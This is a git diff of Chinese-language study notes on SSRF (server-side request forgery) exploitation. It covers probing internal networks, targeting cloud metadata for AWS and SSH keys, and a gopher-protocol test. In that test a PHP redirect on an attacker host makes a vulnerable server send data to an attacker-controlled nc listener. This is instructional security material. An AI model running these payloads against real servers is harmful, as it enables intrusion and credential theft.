@@ -30,7 +30,7 @@ Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> S
 * 内网
   * 探测内网(IP/port/service...)
     * ip 探测内网存活主机
-    * service 端口开放情况 如数据库类的服务
+    * service 端口开放情况 如数据库类的服务 （常用判断依据：HTTP响应码、HTTP响应时长）
     * Cloud Instances 如果含有SSRF漏洞的Web应用运行在云实例 可以尝试获取云服务商提供的让内部主机查询自身的元数据
       * AWS(Aws keys, ssh keys and [more](https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978))
       * Google Cloud
@@ -65,16 +65,26 @@ Attacker --【1】req1-payload-->  Server1(存在SSRF漏洞) ---【2】req2--> S
     
 ### 测试方法 - 以gopher为例
 
+前提：存在SSRF漏洞的web后端所在的服务器必须支持gopher协议，攻击者构造http请求中的payload，发送给web后端，在其服务器上解析gopher协议并向内网主机(或任何网络可达的主机)的任意的端口发送应用层数据。
 
-gopher.php (host it on acttacker.com):
-```
-<?php
-  header('Location: gopher://evil.com:1337/_Hi%0Assrf');
-?>
-```
-同时监听到信息
+先在攻击者公网主机test2.com上监听1337端口，看一会能否收到数据:
 ```
 evil.com:# nc -lvp 1337
+```
+
+gopher.php (在攻击者的公网web服务器test1.com上) :
+如果有http请求访问 http://test1.com/gopher.php 则httpResponse将会是一个301、302跳转，使用gopher协议对某主机的某端口发送数据。
+```
+<?php
+  header('Location: gopher://test2.com:1337/_Hi%0Assrf');
+?>
+```
+
+攻击者构造http请求，试图让 存在SSRF漏洞的web后端所在的服务器 去访问 http://test1.com/gopher.php
+
+
+测试结果，攻击者公网主机test2.com的1337端口，收到了 存在SSRF漏洞的web后端所在的服务器 发来的数据：
+```
 Hi
 ssrf
 ```
